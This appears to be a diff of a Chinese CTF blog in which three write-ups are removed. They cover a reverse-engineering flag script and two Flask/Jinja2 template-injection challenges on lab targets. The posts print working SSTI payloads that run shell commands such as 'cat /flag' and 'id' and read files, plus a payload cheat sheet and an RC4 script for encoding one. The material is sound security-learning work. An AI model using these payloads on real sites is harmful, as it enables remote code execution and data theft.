class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) + (_BYTE)j) &amp; <span class="number">1</span>)</span><br><span class="line">             - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/6.png" alt="6"></p>
-<p>分析可知<strong>flag</strong>是由<strong>f1</strong>和<strong>f2</strong>组成，<strong>f1</strong>已经告诉，现在只需要求<strong>f2</strong>就行。</p>
-<ul>
-<li>
-<p>case4给<strong>f2</strong>赋值</p>
-</li>
-<li>
-<p>case5对<strong>f2</strong>进行处理</p>
-</li>
-</ul>
-<p>swich函数需要排序和，因此顺序是: <strong>case5&gt;case4&gt;case1</strong></p>
-<h2 id="0x05-脚本构建-🍔">0x05 <strong>脚本构建</strong> 🍔</h2>
-<p>由于IDA是反编译C语言，s=0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f应该逆序成s = 0x7F666F6067756369LL作为小端储存，关于大小端推荐师傅的**<a target="_blank" rel="noopener" href="https://blog.csdn.net/iteye_21199/article/details/82205638?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control">文章</a>**</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += s</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/7.png" alt="7"></p>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY&#123;do_not_hate_me&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="4Chan">
-      <meta itemprop="description" content="For U">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="4chan">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/06/BJDCTF-2nd-fake-google/" class="post-title-link" itemprop="url">BJDCTF-2nd-fake-google</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-06 22:34:05 / 修改时间：22:36:44" itemprop="dateCreated datePublished" datetime="2021-04-06T22:34:05+08:00">2021-04-06</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/04/06/BJDCTF-2nd-fake-google/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/06/BJDCTF-2nd-fake-google/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1>0X01 <strong>打开靶机</strong></h1>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/1.png" alt="1"></p>
-<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/3.png" alt="3"></p>
-<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
-<ul>
-<li><em>查看根目录</em></li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/4.png" alt="4"></p>
-<p>ls后台文件出现flag</p>
-<ul>
-<li><em>构造playload，查看flag</em></li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
-<h1><strong>SSTI学习🇭🇺</strong></h1>
-<p>像上面的题目的套路一般直接找playload注入</p>
-<ul>
-<li>
-<h2 id="常用playload">常用playload:</h2>
-</li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="4Chan">
-      <meta itemprop="description" content="For U">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="4chan">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/" class="post-title-link" itemprop="url">CISCN2019-华东南赛区-Double-Secret</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-04-03 20:44:05" itemprop="dateCreated datePublished" datetime="2021-04-03T20:44:05+08:00">2021-04-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-06 22:34:38" itemprop="dateModified" datetime="2021-04-06T22:34:38+08:00">2021-04-06</time>
-              </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>还是太菜了</p>
-</blockquote>
-<h1>0X01 <strong>打开靶机地址，使用Dirsearch进行扫描查看子目录</strong></h1>
-<ul>
-<li><em>Dirsearch扫描网站子目录命令 🍖</em></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u URL -e.php </span><br></pre></td></tr></table></figure>
-<ul>
-<li><em>在URL后面添加扫面的子目录，只要robots.txt有些提示，提示如下</em>(<em>然并软</em>    😓     )</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It is Android ctf</span><br></pre></td></tr></table></figure>
-<h1>0X02 <strong>使用BP进行抓包</strong></h1>
-<p>没有任何线索</p>
-<blockquote>
-<p>想起了页面的提示 Double Secret重新构建URL</p>
-</blockquote>
-<h1>0X03 <strong>重新构造URL</strong></h1>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//1e053da9-5f6a-4ffb-a109-4bbcaf0695d8.node3.buuoj.cn/secret</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png" alt="1"></p>
-<ul>
-<li><em>根据提示，我们double一下</em></li>
-</ul>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/2.png" alt="2"></p>
-<ul>
-<li><em>我们发现在&quot;secret=&quot;后，后面添加不同数字就会产生不同的数值。（这个时候我们的思路大致是SQL，flask，<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>）💇</em></li>
-</ul>
-<h1>0X04 <strong>经过验证，无法使用php伪协议，SQL注入拿到flag，我们试一试flask（后面页面的内容也证实了我们的观点）</strong></h1>
-<h2 id="1-先随便输入几个字符串"><em>1. 先随便输入几个字符串</em></h2>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/3.png" alt="3"></p>
-<h2 id="2-代码如下-暗示得非常明显了-🐹"><em>2. 代码如下(暗示得非常明显了 🐹 )</em></h2>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">​<span class="keyword">if</span>(secret==None)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#解密</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="3-进行代码审计🐺"><em>3. 进行代码审计🐺</em></h2>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;</span>, line <span class="number">1799</span>, <span class="keyword">in</span> dispatch_request</span><br><span class="line"><span class="keyword">return</span> self.view_functions[rule.endpoint](**req.view_args)</span><br><span class="line">File <span class="string">&quot;/app/app.py&quot;</span>, line <span class="number">35</span>, <span class="keyword">in</span> secret</span><br><span class="line">    <span class="keyword">if</span>(secret==None): <span class="meta">#如果secret为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span> <span class="meta">#返回这句话</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#RC4解密</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>
-<p>对我们传入的参数开始进行判断，如果参数是空，就会返回”Tell me your secret.I will encrypt it so others can’t see“这句话，如果传入参数，就会进行RC4加密。同时泄露了密钥&quot;HereIsTreasure&quot; :happy:</p>
-<h2 id="4-构造一下RC4加密脚本"><em>4.构造一下RC4加密脚本</em></h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="5-得到加密的字符串"><em>5.得到加密的字符串</em></h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%<span class="number">14</span>%1E%<span class="number">12</span>%C3%A484mg%C2%9C%C3%8B%<span class="number">00</span>%C2%<span class="number">81</span>%C2%8D%C2%B8%C2%<span class="number">97</span>%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%<span class="number">96</span>%3D%C2%9D%5B%C3%<span class="number">987</span>%C3%AA%<span class="number">12</span>%C2%B4%05%C2%84A%C2%BF%<span class="number">17</span>%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%<span class="number">98</span>/%<span class="number">00</span>%C2%<span class="number">90</span>%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%<span class="number">23</span>%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%<span class="number">92</span></span><br></pre></td></tr></table></figure>
-<h2 id="6-在之前构建的URL后面输入加密的字符串"><em>6.在之前构建的URL后面输入加密的字符串</em></h2>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//2afce8f4-7dee-42fa-bb7a-c9eb932c319e.node3.buuoj.cn/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/4.png" alt="4"></p>
-<h1><strong>拿到flag:happy:</strong></h1>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;class&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> allowed. Secret <span class="keyword">is</span> flag&#123;<span class="number">6e76</span>b7ec<span class="number">-1f</span>75<span class="number">-4686</span><span class="number">-8096</span>-bfa9f35caf9f&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/5.png" alt="5"></p>
-<h1><strong>总结考点：模板注入，RC4加密，python编写脚本</strong></h1>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
 
           </div>
           
+    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -951,6 +536,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%88%E7%AE%80%E5%8D%95%E4%B8%B2%E7%83%A7%E4%B8%80%E4%B8%8B%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">先简单串烧一下一些基本知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">python文件源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-%E5%BC%80%E5%A7%8B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%F0%9F%98%93"><span class="nav-number">3.</span> <span class="nav-text">0X01 开始代码审计 😓</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
